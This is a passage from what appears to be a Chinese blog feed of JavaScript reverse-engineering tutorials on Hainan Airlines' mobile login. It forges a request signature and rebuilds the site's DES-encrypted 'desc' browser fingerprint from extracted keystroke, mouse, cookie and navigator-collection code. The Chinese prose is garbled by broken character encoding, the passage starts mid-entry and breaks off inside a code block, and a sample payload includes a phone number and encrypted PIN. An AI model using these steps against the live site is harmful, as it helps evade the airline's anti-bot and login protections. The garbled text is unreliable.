â€œ<strong>38195</strong>â€</p><p>ç„¶åä¾æ¬¡æ ¹æ®æç¤ºï¼Œç¼ºå°‘ä»€ä¹ˆæ¨¡å—å°±æ‰£å–ä»€ä¹ˆ</p><p>å¦‚æœæ‰£å–è¿‡ç¨‹ä¸­æœ‰å‡ºç°æŠ¥æŠ¥é”™ï¼Œé‚£å°±è§£å†³æŠ¥é”™ã€‚</p><p>åŠ è½½æ¨¡å—æ¯”è¾ƒå¤šï¼Œæ‰£å–ä»£ç éƒ½è¦å¥½ä¹…~~~</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101651366.png" alt="image.png"> </p><h2 id="3ã€è‡ªå®šä¹‰åŠ å¯†å‡½æ•°"><a href="#3ã€è‡ªå®šä¹‰åŠ å¯†å‡½æ•°" class="headerlink" title="3ã€è‡ªå®šä¹‰åŠ å¯†å‡½æ•°"></a>3ã€è‡ªå®šä¹‰åŠ å¯†å‡½æ•°</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Spring</span> = <span class="title function_">_b</span>(<span class="number">38195</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span>  c = <span class="string">&#x27;&#123;&#125;&#x27;</span>,</span><br><span class="line">    p = <span class="string">&#x27;&#123;&quot;sname&quot;:&quot;Win32&quot;,&quot;sver&quot;:&quot;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36&quot;,&quot;schannel&quot;:&quot;HTML5&quot;,&quot;caller&quot;:&quot;HTML5&quot;,&quot;slang&quot;:&quot;zh-CN&quot;,&quot;did&quot;:&quot;97f572851c0ce1eb&quot;,&quot;stime&quot;:1696338450273,&quot;szone&quot;:-480,&quot;aname&quot;:&quot;com.hnair.spa.web.standard&quot;,&quot;aver&quot;:&quot;9.0.0&quot;,&quot;akey&quot;:&quot;9E4BBDDEC6C8416EA380E418161A7CD3&quot;,&quot;abuild&quot;:&quot;45469&quot;,&quot;atarget&quot;:&quot;standard&quot;,&quot;slat&quot;:&quot;slat&quot;,&quot;slng&quot;:&quot;slng&quot;,&quot;gtcid&quot;:&quot;defualt_web_gtcid&quot;,&quot;riskToken&quot;:&quot;651abaafiQI4S3rKQfX7DXPlLlrGKPBuW2iBlSJ1&quot;,&quot;captchaToken&quot;:&quot;&quot;,&quot;number&quot;:&quot;15888888888&quot;,&quot;pin&quot;:&quot;JwWZ9E/1ZByN8jrtlHnMhJpNaELFx0rZ3iQgeqCMIaYS2sfOgDvofgDSvowAO5yUM9i8shhYV/KlViMgwrtMdAfSZgpTvUzETQrrPgf2nCdA+7sh+sWGSEQKTlCwzom67NNkEqqzO1QPUbJJa5XlNjKTa8obqdvZ9dbs/kF/tWE=&quot;,&quot;toSave&quot;:true&#125;&#x27;</span>,</span><br><span class="line">    n = <span class="literal">null</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">makeSign</span>(<span class="params">c,p,n</span>)&#123;</span><br><span class="line">    c = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(c)</span><br><span class="line">    p = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(p)</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Spring</span>.<span class="title function_">_makeSign</span>(<span class="literal">null</span>, c, p, <span class="literal">null</span>, n)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="4ã€æµ‹è¯•"><a href="#4ã€æµ‹è¯•" class="headerlink" title="4ã€æµ‹è¯•"></a>4ã€æµ‹è¯•</h2><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101651670.png" alt="image.png"> </p><h1 id="ä¸‰ã€å®Œæ•´ä»£ç "><a href="#ä¸‰ã€å®Œæ•´ä»£ç " class="headerlink" title="ä¸‰ã€å®Œæ•´ä»£ç "></a>ä¸‰ã€å®Œæ•´ä»£ç </h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ç•¥ç•¥ç•¥</span><br><span class="line">~~~</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JSé€†å‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JSé€†å‘ </tag>
            
            <tag> éªŒç­¾ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æµ·å—èˆªç©ºDescè¡¥ç¯å¢ƒ</title>
      <link href="/2024/05/10/%E6%B5%B7%E5%8D%97%E8%88%AA%E7%A9%BADesc%E8%A1%A5%E7%8E%AF%E5%A2%83/"/>
      <url>/2024/05/10/%E6%B5%B7%E5%8D%97%E8%88%AA%E7%A9%BADesc%E8%A1%A5%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="ä¸€ã€é€†å‘ç›®æ ‡"><a href="#ä¸€ã€é€†å‘ç›®æ ‡" class="headerlink" title="ä¸€ã€é€†å‘ç›®æ ‡"></a>ä¸€ã€é€†å‘ç›®æ ‡</h1><ul><li>ç›®æ ‡ï¼šæµ·å—èˆªç©ºDescè¡¥ç¯å¢ƒåˆæ¢</li><li>é“¾æ¥ï¼š<a href="https://m.hnair.com/#/login?_k=oepcby">https://m.hnair.com/#/login?_k=oepcby</a></li><li>ç®€ä»‹ï¼šæµè§ˆå™¨æŒ‡çº¹ï¼Œè¡¥ç¯å¢ƒåˆæ¢</li></ul><p> <img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101635232.png" alt="image.png"> </p><h1 id="äºŒã€é€†å‘å‚æ•°"><a href="#äºŒã€é€†å‘å‚æ•°" class="headerlink" title="äºŒã€é€†å‘å‚æ•°"></a>äºŒã€é€†å‘å‚æ•°</h1><h2 id="1ã€å®šä½descåŠ å¯†ä½ç½®"><a href="#1ã€å®šä½descåŠ å¯†ä½ç½®" class="headerlink" title="1ã€å®šä½descåŠ å¯†ä½ç½®"></a>1ã€å®šä½descåŠ å¯†ä½ç½®</h2><p>æœç´¢å…³é”®å­— â€œdesc&#x3D;â€ï¼Œæœ‰ä¸¤å¤„ä½ç½®ï¼Œéƒ½æ‰“ä¸Šæ–­ç‚¹ï¼ŒæˆåŠŸå®šä½åˆ°äº†åŠ å¯†ä½ç½®ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101636163.png" alt="image.png"> </p><p>å¯ä»¥çœ‹åˆ°è¿™å—çš„ U å°±æ˜¯åŠ å¯†åçš„ desc</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var u = function() &#123;</span><br><span class="line">                        try &#123;</span><br><span class="line">                            return (new born).getCiphertext()</span><br><span class="line">                        &#125; catch (e) &#123;</span><br><span class="line">                            return null</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;();</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101637632.png" alt="image.png"> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">return (new born).getCiphertext()</span><br></pre></td></tr></table></figure><h2 id="2ã€åŠ å¯†å‡½æ•°åˆ†æ"><a href="#2ã€åŠ å¯†å‡½æ•°åˆ†æ" class="headerlink" title="2ã€åŠ å¯†å‡½æ•°åˆ†æ"></a>2ã€åŠ å¯†å‡½æ•°åˆ†æ</h2><p><strong>1ï¼‰è·Ÿè¿›å®šä¹‰çš„å¯¹è±¡ born ä¸­ï¼Œå‘ç°åªæ˜¯å®šä¹‰äº†è¿™ä¸ªå¯¹è±¡é‡Œé¢æ²¡æœ‰ä»»ä½•å±æ€§å’Œæ–¹æ³•</strong></p><p>çŒœæµ‹å¯èƒ½æ˜¯è¿™ä¸ªç±»çš„   æ„é€ æ–¹æ³•&#x2F;åŸå‹å¯¹è±¡  ä¸­æœ‰å®šä¹‰ç›¸å…³å†…å®¹ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101638100.png" alt="image.png"> </p><p><strong>2ï¼‰æ‰€ä»¥ï¼Œç›´æ¥è·Ÿè¿›(new born).getCiphertextè¿™ä¸ªæ–¹æ³•ä¸­ ï¼Œå‘ç°äº†å¦‚ä¸‹ä»£ç </strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">born.prototype = &#123;</span><br><span class="line">    getCiphertext: function() &#123;</span><br><span class="line">        return ciphertext</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101640855.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101640299.png" alt="image.png"> </p><p>è¿™å—æ˜¯ç›´æ¥è¿”å›äº†ä¸€ä¸ª â€œciphertextâ€ ,ä¹Ÿæ²¡æœ‰è°ƒç”¨ä»»ä½•å‡½æ•°ã€‚æ‰€ä»¥çŒœæµ‹è¿™ä¸ª â€œciphertextâ€ å¯èƒ½æ˜¯ä¸ªå…¨å±€å˜é‡</p><p><strong>3ï¼‰æ‰€ä»¥ï¼Œåœ¨å½“å‰JSä¸­æœç´¢ä¸€ä¸‹å…³é”®å­—  â€œciphertextâ€ ï¼Œæ‰¾åˆ°5å¤„ï¼Œéƒ½æ‰“ä¸Šæ–­ç‚¹ï¼Œçœ‹çœ‹ä¼šæ–­åœ¨å“ªå„¿</strong></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101640538.png" alt="image.png"> </p><p>ä½†æ˜¯ï¼Œç‚¹å‡»ã€ç™»å½•ã€‘åï¼Œå‘ç°å¹¶æ²¡æœ‰æ–­ä¸‹ï¼Œè¿™æ˜¯ä¸ºå•¥ä½ ï¼Ÿï¼Ÿï¼Ÿï¼Ÿ</p><p>è¿™æ˜¯å› ä¸ºï¼Œdescè¡¨ç¤ºçš„æ˜¯æµè§ˆå™¨çš„æŒ‡çº¹ä¿¡æ¯ï¼Œå¹¶ä¸”å°†å…¶å®šä¹‰ä¸ºäº†å…¨å±€å˜é‡ï¼ŒçŒœæµ‹å¯èƒ½æ˜¯åœ¨é¡µé¢åŠ è½½çš„æ—¶å€™å°±å®šä¹‰å¥½äº†å·²ç»ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬åˆ·æ–°é¡µé¢ï¼ŒæˆåŠŸæ–­ä¸‹ï¼š</p><p>è¿™å—æ˜¯å°† â€œtâ€ èµ‹å€¼ç»™äº† â€œciphertextâ€</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101641949.png" alt="image.png"> </p><p><strong>4ï¼‰å‘å‰è·Ÿæ ˆï¼Œæ‰¾åˆ°å®šä¹‰å‚æ•° t çš„ä½ç½®ï¼š</strong></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101641107.png" alt="image.png"> </p><p>è¿™å—å¯ä»¥åˆ¤æ–­å¤„å½“å‰åŠ å¯†ä¸º DESåŠ å¯†æ–¹å¼ã€‚</p><p><strong>5ï¼‰è¿™ä¸ªå‡½æ•°ä¼ å…¥äº†ä¸¤ä¸ªå‚æ•° e å’Œ t</strong></p><p>å‘å‰ç»§ç»­è·Ÿæ ˆï¼Œæ‰¾åˆ°äº†è¿™ä¸¤ä¸ªå‚æ•°çš„å®šä¹‰å¤„ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var fingerprint = (new referFingerprint).get();</span><br><span class="line">window[_hqjl(&quot;rzKroleD&quot;, 3, 3)] = function(e) &#123;</span><br><span class="line">    mcArrs.ex_mouse(e);</span><br><span class="line">    var t = &#123;</span><br><span class="line">        xy: mcArrs,</span><br><span class="line">        fingerprint: fingerprint</span><br><span class="line">    &#125;</span><br><span class="line">      , r = JSON.stringify(t)</span><br><span class="line">      , n = eq_u(r, zznu(zre));</span><br><span class="line">    window[coyp](_hqjl(&quot;ycrtrehpixext\\&quot;, 7, 2) + &quot;=&#x27;&quot; + n + &quot;&#x27;&quot;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101642402.png" alt="image.png"> </p><p>â‘ ç¬¬ä¸€ä¸ªå‚æ•°rï¼š</p><p>æš´åŠ›æ‰£å–JSï¼Œå°†è¿™ä¸ªå‡½æ•°ä¹‹å‰çš„å¾…JSå…¨éƒ¨æ‰£å–ä¸‹æ¥ï¼Œæµ‹è¯•ï¼ŒæˆåŠŸæ‹¿åˆ°å‚æ•°rçš„å€¼</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101642501.png" alt="image.png"> </p><p>â‘¡ç¬¬äºŒä¸ªå‚æ•° zznu(zre) </p><p>è¿™å—å°±åªéœ€è¦å°† zznu è¿™ä¸ªå‡½æ•°æ‰£å–ä¸‹æ¥å³å¯ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101642328.png" alt="image.png"> </p><p>ç„¶åæ˜¯zreè¿™ä¸ªå˜é‡å€¼ï¼š</p><p>æš‚æ—¶æ²¡æœ‰æ‰¾åˆ°æ˜¯åœ¨å“ªå„¿å®šä¹‰çš„ï¼Œå…ˆä¸ç®¡äº†ï¼</p><p><strong>6ï¼‰æ‰£å–JSå¹¶æµ‹è¯•</strong></p><p>æœ‰ä¸€äº›å°å‘ï¼Œä½†æ˜¯å¯ä»¥æš´åŠ›ä¸€ç‚¹ï¼Œå°†æ•´ä¸ªJSéƒ½æ‰£å–ä¸‹æ¥ï¼Œç„¶åå“ªå—æŠ¥é”™å°±åˆ é™¤å“ªå—ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101643274.png" alt="image.png"> </p><h1 id="ä¸‰ã€å®Œæ•´ä»£ç "><a href="#ä¸‰ã€å®Œæ•´ä»£ç " class="headerlink" title="ä¸‰ã€å®Œæ•´ä»£ç "></a>ä¸‰ã€å®Œæ•´ä»£ç </h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">keypress</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> t = <span class="number">0</span></span><br><span class="line">      , r = <span class="number">0</span></span><br><span class="line">      , e = e || event;</span><br><span class="line">    t = e.<span class="property">keyCode</span> || e.<span class="property">which</span> || e.<span class="property">charCode</span>,</span><br><span class="line">    r = t &gt;= <span class="number">65</span> &amp;&amp; <span class="number">90</span> &gt;= t,</span><br><span class="line">    z = t &gt;= <span class="number">97</span> &amp;&amp; <span class="number">122</span> &gt;= t,</span><br><span class="line">    mcArrps.<span class="title function_">push</span>(t)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">keydown</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> e = e || event</span><br><span class="line">      , t = e.<span class="property">keyCode</span> || e.<span class="property">which</span> || e.<span class="property">charCode</span></span><br><span class="line">      , r = t;</span><br><span class="line">    t &gt; <span class="number">7</span> &amp;&amp; <span class="number">14</span> &gt; t || <span class="number">20</span> == t || <span class="number">91</span> == t || <span class="number">16</span> == t || <span class="number">17</span> == t || <span class="number">222</span> == t || t &gt; <span class="number">31</span> &amp;&amp; <span class="number">47</span> &gt; t || t &gt; <span class="number">111</span> &amp;&amp; <span class="number">124</span> &gt; t ? (e.<span class="property">ctrlKey</span> &amp;&amp; <span class="number">17</span> != t ? r = <span class="string">&quot;CTRL+&quot;</span> + r : e.<span class="property">altKey</span> &amp;&amp; <span class="number">18</span> != t ? r = <span class="string">&quot;ALT+&quot;</span> + r : e.<span class="property">shiftKey</span> &amp;&amp; <span class="number">16</span> != t ? r = <span class="string">&quot;SHIFT+&quot;</span> + r : e.<span class="property">ctrlKey</span> &amp;&amp; <span class="number">17</span> != t &amp;&amp; e.<span class="property">altKey</span> &amp;&amp; <span class="number">18</span> != t ? r = <span class="string">&quot;CTRL+ALT+&quot;</span> + r : e.<span class="property">ctrlKey</span> &amp;&amp; <span class="number">17</span> != t &amp;&amp; e.<span class="property">altKey</span> &amp;&amp; <span class="number">18</span> != t &amp;&amp; e.<span class="property">shiftKey</span> &amp;&amp; <span class="number">16</span> != t ? r = <span class="string">&quot;CTRL+ALT+SHIFT+&quot;</span> + r : e.<span class="property">altKey</span> &amp;&amp; <span class="number">18</span> != t &amp;&amp; e.<span class="property">shiftKey</span> &amp;&amp; <span class="number">16</span> != t ? r = <span class="string">&quot;ALT+SHIFT+&quot;</span> + r : e.<span class="property">altKey</span> &amp;&amp; <span class="number">17</span> != t &amp;&amp; e.<span class="property">shiftKey</span> &amp;&amp; <span class="number">16</span> != t &amp;&amp; (r = <span class="string">&quot;CTRL+SHIFT+&quot;</span> + r),</span><br><span class="line">    <span class="string">&quot;&quot;</span> != r &amp;&amp; mcArrps.<span class="title function_">push</span>(r)) : <span class="variable language_">window</span>.<span class="property">ActiveXObject</span> &amp;&amp; -<span class="number">1</span> != navigator.<span class="property">appVersion</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;Windows&quot;</span>) ? (r = t,</span><br><span class="line">    e.<span class="property">ctrlKey</span> &amp;&amp; <span class="number">17</span> != t ? r = <span class="string">&quot;CTRL+&quot;</span> + r : e.<span class="property">altKey</span> &amp;&amp; <span class="number">18</span> != t ? r = <span class="string">&quot;ALT+&quot;</span> + r : e.<span class="property">shiftKey</span> &amp;&amp; <span class="number">16</span> != t ? r = <span class="string">&quot;SHIFT+&quot;</span> + r : e.<span class="property">ctrlKey</span> &amp;&amp; <span class="number">17</span> != t &amp;&amp; e.<span class="property">altKey</span> &amp;&amp; <span class="number">18</span> != t ? r = <span class="string">&quot;CTRL+ALT+&quot;</span> + r : e.<span class="property">ctrlKey</span> &amp;&amp; <span class="number">17</span> != t &amp;&amp; e.<span class="property">altKey</span> &amp;&amp; <span class="number">18</span> != t &amp;&amp; e.<span class="property">shiftKey</span> &amp;&amp; <span class="number">16</span> != t ? r = <span class="string">&quot;CTRL+ALT+SHIFT+&quot;</span> + r : e.<span class="property">altKey</span> &amp;&amp; <span class="number">18</span> != t &amp;&amp; e.<span class="property">shiftKey</span> &amp;&amp; <span class="number">16</span> != t ? r = <span class="string">&quot;ALT+SHIFT+&quot;</span> + r : e.<span class="property">altKey</span> &amp;&amp; <span class="number">17</span> != t &amp;&amp; e.<span class="property">shiftKey</span> &amp;&amp; <span class="number">16</span> != t &amp;&amp; (r = <span class="string">&quot;CTRL+SHIFT+&quot;</span> + r),</span><br><span class="line">    <span class="string">&quot;&quot;</span> != r &amp;&amp; mcArrps.<span class="title function_">push</span>(r)) : e.<span class="property">ctrlKey</span> &amp;&amp; <span class="number">17</span> != t ? (r = <span class="string">&quot;CTRL+&quot;</span> + r,</span><br><span class="line">    mcArrps.<span class="title function_">push</span>(r)) : e.<span class="property">altKey</span> &amp;&amp; <span class="number">18</span> != t ? (r = <span class="string">&quot;ALT+&quot;</span> + r,</span><br><span class="line">    mcArrps.<span class="title function_">push</span>(r)) : e.<span class="property">shiftKey</span> &amp;&amp; <span class="number">16</span> != t ? (r = <span class="string">&quot;SHIFT+&quot;</span> + r,</span><br><span class="line">    mcArrps.<span class="title function_">push</span>(r)) : e.<span class="property">ctrlKey</span> &amp;&amp; <span class="number">17</span> != t &amp;&amp; e.<span class="property">altKey</span> &amp;&amp; <span class="number">18</span> != t ? (r = <span class="string">&quot;CTRL+ALT+&quot;</span> + r,</span><br><span class="line">    mcArrps.<span class="title function_">push</span>(r)) : e.<span class="property">ctrlKey</span> &amp;&amp; <span class="number">17</span> != t &amp;&amp; e.<span class="property">altKey</span> &amp;&amp; <span class="number">18</span> != t &amp;&amp; e.<span class="property">shiftKey</span> &amp;&amp; <span class="number">16</span> != t ? (r = <span class="string">&quot;CTRL+ALT+SHIFT+&quot;</span> + r,</span><br><span class="line">    mcArrps.<span class="title function_">push</span>(r)) : e.<span class="property">altKey</span> &amp;&amp; <span class="number">18</span> != t &amp;&amp; e.<span class="property">shiftKey</span> &amp;&amp; <span class="number">16</span> != t ? (r = <span class="string">&quot;ALT+SHIFT+&quot;</span> + r,</span><br><span class="line">    mcArrps.<span class="title function_">push</span>(r)) : e.<span class="property">altKey</span> &amp;&amp; <span class="number">17</span> != t &amp;&amp; e.<span class="property">shiftKey</span> &amp;&amp; <span class="number">16</span> != t &amp;&amp; (r = <span class="string">&quot;CTRL+SHIFT+&quot;</span> + r,</span><br><span class="line">    mcArrps.<span class="title function_">push</span>(r))</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">del_html_tags</span>(<span class="params">e, t, r</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> n = <span class="keyword">new</span> <span class="title class_">RegExp</span>(t,<span class="string">&quot;g&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> words = e.<span class="title function_">replace</span>(n, r),</span><br><span class="line">    words</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getScriptPaths</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> e, t = <span class="variable language_">document</span>.<span class="property">scripts</span>, r = t.<span class="property">length</span>; r &gt; <span class="number">0</span>; r--)</span><br><span class="line">        t[r - <span class="number">1</span>].<span class="property">src</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;ex_mouse.js&quot;</span>) &gt; -<span class="number">1</span> &amp;&amp; (e = t[r - <span class="number">1</span>].<span class="property">src</span>.<span class="title function_">substring</span>(<span class="number">0</span>, t[r - <span class="number">1</span>].<span class="property">src</span>.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>));</span><br><span class="line">    <span class="keyword">return</span> e</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getBroClient</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> e = <span class="keyword">new</span> <span class="title function_">referFingerprint</span>(&#123;</span><br><span class="line">        <span class="attr">canvas</span>: !<span class="number">0</span></span><br><span class="line">    &#125;)</span><br><span class="line">      , t = <span class="built_in">parseInt</span>((<span class="keyword">new</span> <span class="title class_">Date</span>).<span class="title function_">getTime</span>() / <span class="number">1e3</span>)</span><br><span class="line">      , r = &#123;&#125;;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">document</span> &amp;&amp; (r.<span class="property">dc_domain</span> = <span class="variable language_">document</span>.<span class="property">domain</span> || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">dc_url</span> = <span class="variable language_">document</span>.<span class="property">URL</span> || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">dc_title</span> = <span class="variable language_">document</span>.<span class="property">title</span> || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">dc_referrer</span> = <span class="variable language_">document</span>.<span class="property">referrer</span> || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">dc_cookies</span> = <span class="variable language_">document</span>.<span class="property">cookie</span> || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">dc_websign</span> = e.<span class="title function_">get</span>() || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">dc_arrtime</span> = t || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">dc_officeXY</span> = <span class="variable language_">window</span>.<span class="property">screen</span>.<span class="property">availWidth</span> + <span class="string">&quot;x &quot;</span> + <span class="variable language_">window</span>.<span class="property">screen</span>.<span class="property">availHeight</span> + <span class="string">&quot;y&quot;</span> || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">dc_coloriDepth</span> = broClient.<span class="title function_">coloriDepth</span>(<span class="variable language_">window</span>.<span class="property">navigator</span>) || <span class="string">&quot;&quot;</span>),</span><br><span class="line">    <span class="variable language_">window</span> &amp;&amp; <span class="variable language_">window</span>.<span class="property">screen</span> &amp;&amp; (r.<span class="property">sh</span> = <span class="variable language_">window</span>.<span class="property">screen</span>.<span class="property">height</span> || <span class="number">0</span>,</span><br><span class="line">    r.<span class="property">sw</span> = <span class="variable language_">window</span>.<span class="property">screen</span>.<span class="property">width</span> || <span class="number">0</span>,</span><br><span class="line">    r.<span class="property">cd</span> = <span class="variable language_">window</span>.<span class="property">screen</span>.<span class="property">colorDepth</span> || <span class="number">0</span>),</span><br><span class="line">    navigator &amp;&amp; (r.<span class="property">na_appcodename</span> = navigator.<span class="property">appCodeName</span> || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">na_minor</span> = navigator.<span class="property">appMinorVersion</span> || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">na_appname</span> = navigator.<span class="property">appName</span> || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">na_appversion</span> = navigator.<span class="property">appVersion</span> || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">na_bl</span> = navigator.<span class="property">browserLanguage</span> || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">na_cookiesEnable</span> = navigator.<span class="property">cookieEnabled</span> || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">na_cpuclass</span> = navigator.<span class="property">cpuClass</span> || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">na_online</span> = navigator.<span class="property">onLine</span> || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">na_platform</span> = navigator.<span class="property">platform</span> || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">na_syslan</span> = navigator.<span class="property">systemLanguage</span> || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">na_useragent</span> = navigator.<span class="property">userAgent</span> || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">na_userlang</span> = navigator.<span class="property">userLanguage</span> || <span class="string">&quot;&quot;</span>),</span><br><span class="line">    r</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">broWidgetIe</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> t = [], r = <span class="number">0</span>; r &lt; e.<span class="property">length</span>; r++) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            widget = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(e[r])</span><br><span class="line">        &#125; <span class="keyword">catch</span> (n) &#123;</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        &#125;</span><br><span class="line">        t.<span class="title function_">push</span>(e[r])</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getBroWidgetInfo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> e = &#123;</span><br><span class="line">        <span class="title class_">ShockwaveFlash</span>: broWidget.<span class="title function_">shockwaveFlash</span>(),</span><br><span class="line">        <span class="title class_">ReadPlayer</span>: broWidget.<span class="title function_">readPlayer</span>(),</span><br><span class="line">        <span class="title class_">AdobeReader</span>: broWidget.<span class="title function_">adobeReader</span>(),</span><br><span class="line">        <span class="title class_">QuickTimePlayer</span>: broWidget.<span class="title function_">quickTimePlayer</span>(),</span><br><span class="line">        <span class="title class_">ShockwavePlayer</span>: broWidget.<span class="title function_">shockwavePlayer</span>(),</span><br><span class="line">        <span class="title class_">WindowsMediaPlayer</span>: broWidget.<span class="title function_">windowsMediaPlayer</span>()</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> e</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getShockwaveFlash</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> e = !<span class="number">1</span></span><br><span class="line">      , t = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">ActiveXObject</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> r = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            r = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&quot;ShockwaveFlash.ShockwaveFlash&quot;</span>)</span><br><span class="line">        &#125; <span class="keyword">catch</span> (n) &#123;</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        r &amp;&amp; (e = !<span class="number">0</span>,</span><br><span class="line">        t = r.<span class="title class_">GetVariable</span>(<span class="string">&quot;$version&quot;</span>).<span class="title function_">substring</span>(<span class="number">4</span>),</span><br><span class="line">        t = t.<span class="title function_">split</span>(<span class="string">&quot;,&quot;</span>),</span><br><span class="line">        t = <span class="built_in">parseFloat</span>(t[<span class="number">0</span>] + <span class="string">&quot;.&quot;</span> + t[<span class="number">1</span>]))</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">        t = navigator.<span class="property">plugins</span>[<span class="string">&quot;Shockwave Flash&quot;</span>];</span><br><span class="line">    <span class="keyword">return</span> t = <span class="literal">null</span> != t || <span class="keyword">void</span> <span class="number">0</span> != t ? <span class="number">1</span> : <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getReadPlayer</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> e = !<span class="number">1</span></span><br><span class="line">      , t = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">ActiveXObject</span>) &#123;</span><br><span class="line">        <span 